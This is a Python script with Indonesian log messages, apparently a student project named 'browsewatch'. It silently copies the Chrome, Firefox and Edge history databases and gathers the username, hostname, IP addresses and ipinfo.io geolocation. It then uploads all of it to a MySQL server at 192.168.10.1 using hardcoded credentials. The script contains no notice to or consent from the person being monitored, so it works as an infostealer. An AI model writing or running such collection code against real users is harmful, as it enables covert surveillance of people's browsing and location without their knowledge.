import os, logging, sqlite3, shutil, psutil, socket, platform, requests, pymysql
from datetime import datetime

def get_chrome_history(limit=20):
    base_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
    
    profile_dirs = [os.path.join(base_path, d) for d in os.listdir(base_path)
                if os.path.isdir(os.path.join(base_path, d))
                and 'Guest' not in d  
                and os.path.exists(os.path.join(base_path, d, 'History'))]

    if not profile_dirs:
        logging.error("File history Chrome tidak ditemukan di profil mana pun.")
        return []

    history_path = os.path.join(profile_dirs[0], 'History')

    try:
        temp_path = 'History_temp'
        shutil.copy2(history_path, temp_path)

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls WHERE last_visit_time IS NOT NULL ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        conn.close()
        os.remove(temp_path)

        history_list = []
        for url, title, last_visit_time in rows:
            timestamp = datetime.fromtimestamp(last_visit_time / 1000000).strftime('%Y-%m-%d %H:%M:%S')
            history_list.append({'title': title, 'url': url, 'timestamp': timestamp})
        logging.info(f"Berhasil mengambil {len(history_list)} history Chrome dari folder {profile_dirs[0]}.")
        return history_list
    except Exception as e:
        logging.exception(f"Gagal membaca history Chrome: {e}")
        return []

def get_firefox_history(limit=20):
    path = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles')
    if not os.path.exists(path):
        logging.error("Folder profil Firefox tidak ditemukan.")
        return []

    profile_dirs = [os.path.join(path, d) for d in os.listdir(path)
                    if os.path.isdir(os.path.join(path, d)) and
                    os.path.exists(os.path.join(path, d, 'places.sqlite'))]

    if not profile_dirs:
        logging.error("Tidak ditemukan file places.sqlite di profil Firefox manapun.")
        return []

    profile_path = os.path.join(profile_dirs[0], 'places.sqlite')

    try:
        temp_path = 'places_temp.sqlite'
        shutil.copy2(profile_path, temp_path)

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        conn.close()
        os.remove(temp_path)

        history_list = []
        for url, title, last_visit_time in rows:
            timestamp = datetime.fromtimestamp(last_visit_time / 1000000).strftime('%Y-%m-%d %H:%M:%S')
            history_list.append({'title': title, 'url': url, 'timestamp': timestamp})
        logging.info(f"Berhasil mengambil {len(history_list)} history Firefox dari folder {profile_dirs[0]}.")
        return history_list
    except Exception as e:
        logging.exception(f"Error membaca history Firefox: {e}")
        return []

def get_edge_history(limit=20):
    path = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
    if not os.path.exists(path):
        error_message = "File history Edge tidak ditemukan. Pastikan Edge benar-benar sudah ditutup."
        logging.error(error_message)
        return []
    try:
        temp_path = 'History_temp_edge'
        shutil.copy2(path, temp_path)

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        conn.close()
        os.remove(temp_path)

        history_list = []
        for url, title, last_visit_time in rows:
            timestamp = datetime.fromtimestamp(last_visit_time / 1000000).strftime('%Y-%m-%d %H:%M:%S')
            history_list.append({'title': title, 'url': url, 'timestamp': timestamp})
        logging.info(f"Berhasil mengambil {len(history_list)} history Edge.")
        return history_list
    except Exception as e:
        error_message = f"Error membaca history Edge: {e}"
        logging.exception(error_message)
        return []
    
def get_system_info():
    info = {}

    try:
        info['username'] = os.getlogin()
    except Exception as e:
        info['username'] = 'Tidak dapat diambil'
        logging.warning(f"Gagal mengambil username: {e}")

    try:
        info['hostname'] = socket.gethostname()
    except Exception as e:
        info['hostname'] = 'Tidak dapat diambil'
        logging.warning(f"Gagal mengambil hostname: {e}")

    try:
        info['os'] = platform.system() + " " + platform.release()
    except Exception as e:
        info['os'] = 'Tidak dapat diambil'
        logging.warning(f"Gagal mengambil OS: {e}")

    try:
        info['local_ip'] = socket.gethostbyname(socket.gethostname())
    except Exception as e:
        info['local_ip'] = 'Tidak dapat diambil'
        logging.warning(f"Gagal mengambil IP lokal: {e}")

    try:
        ip_data = requests.get('https://ipinfo.io/json').json()
        info['public_ip'] = ip_data.get('ip', 'Tidak diketahui')
        info['city'] = ip_data.get('city', 'Tidak diketahui')
        info['region'] = ip_data.get('region', 'Tidak diketahui')
        info['country'] = ip_data.get('country', 'Tidak diketahui')
        info['latitude'] = ip_data.get('loc').split(',')[0]
        info['longitude'] = ip_data.get('loc').split(',')[1]
    except Exception as e:
        info['public_ip'] = 'Tidak diketahui'
        info['city'] = 'Tidak diketahui'
        info['region'] = 'Tidak diketahui'
        info['country'] = 'Tidak diketahui'
        info['latitude'] = 'Tidak diketahui'
        info['longitude'] = 'Tidak diketahui'
        logging.warning(f"Gagal mengambil info lokasi dari ipinfo.io: {e}")

    logging.info("Berhasil mengambil info sistem.")
    return info

def get_network_activity():
    net_io = psutil.net_io_counters()
    return {
        'bytes_sent': net_io.bytes_sent,
        'bytes_recv': net_io.bytes_recv,
        'packets_sent': net_io.packets_sent,
        'packets_recv': net_io.packets_recv
    }

def save_to_database(system_info, net_activity, chrome_history, firefox_history, edge_history):
    try:
        conn = pymysql.connect(
            user='PBL',
            password='history',  
            host='192.168.10.1',
            port=3306,
            database='browsewatch'  
        )
        cur = conn.cursor()

        def format_history(history):
            return '\n'.join([f"[{h['timestamp']}] {h['title']} - {h['url']}" for h in history]) if history else None


        query = """
            INSERT INTO system_info (
                username, hostname, os, local_ip, public_ip, city, region, country, 
                latitude, longitude, bytes_sent, bytes_recv, packets_sent, packets_recv, 
                chrome_history, firefox_history, edge_history
            ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
        """

        cur.execute(query, (
            system_info['username'],
            system_info['hostname'],
            system_info['os'],
            system_info['local_ip'],
            system_info['public_ip'],
            system_info['city'],
            system_info['region'],
            system_info['country'],
            system_info['latitude'],
            system_info['longitude'],
            net_activity['bytes_sent'],
            net_activity['bytes_recv'],
            net_activity['packets_sent'],
            net_activity['packets_recv'],
            format_history(chrome_history),
            format_history(firefox_history),
            format_history(edge_history)
        ))
        conn.commit()
        print("✅ Data berhasil disimpan ke database XAMPP!")
        conn.close()
    except pymysql.Error as e:
        print(f"❌ Gagal menyimpan data ke database: {e}")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    system_info = get_system_info()
    net_activity = get_network_activity()

    chrome_history = get_chrome_history()
    firefox_history = get_firefox_history()
    edge_history = get_edge_history()

    save_to_database(system_info, net_activity, chrome_history, firefox_history, edge_history)